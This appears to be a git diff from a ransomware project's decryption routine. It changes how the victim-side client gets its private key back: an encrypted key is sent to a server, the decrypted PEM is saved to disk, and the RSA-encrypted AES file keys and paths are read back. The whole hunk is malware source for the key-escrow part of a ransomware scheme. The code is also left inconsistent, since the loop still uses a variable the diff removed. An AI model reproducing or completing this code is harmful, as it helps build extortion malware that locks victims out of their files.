@@ -60,25 +60,32 @@ def menu():
     desktop = enviroment.get_desktop_path()
     username = enviroment.get_username()
     ransomware_path = os.path.join(home, ransomware_name[0])
-    id = enviroment.get_unique_machine_id()
+    machine_id = enviroment.get_unique_machine_id()
 
-    
 
     # import the private key
-    with open("private_key") as f:
-        private_key = f.read()
-    Client_private_key = RSA.importKey(private_key)
-
+    with open(ransomware_path + '/encrypted_private_key.key', 'rb') as f:
+        encrypted_client_private_key = pickle.load(f)
     
-    # GET THE AES KEYS
-    with open(ransomware_path + "AES_encrypted_keys") as f:
+    # send to server to be decrypted
+    client_private_key = send_to_server_encrypted_private_key(machine_id, encrypted_client_private_key)
+    
+    # saving to disk the private key
+    with open(ransomware_path + "/client_private_key.PEM", 'wb') as f:
+        f.write(client_private_key)
+
+    # Private key object
+    client_private_key_object = RSA.importKey(client_private_key)
+
+    # GET THE AES KEYS and path
+    with open(ransomware_path + "/AES_encrypted_keys") as f:
         content = f.read()
      
     # get the aes keys and IV's and paths back
     content = content.split('\n')
     aes_and_path = []
     for line in content:
-        ret = line.split(' ') # KEY base64(PATH)
+        ret = line.split(' ') # enc(KEY) base64(PATH)
         encrypted_aes_key = ret[0]
         aes_key = Client_private_key.decrypt(encrypted_aes_key)
 
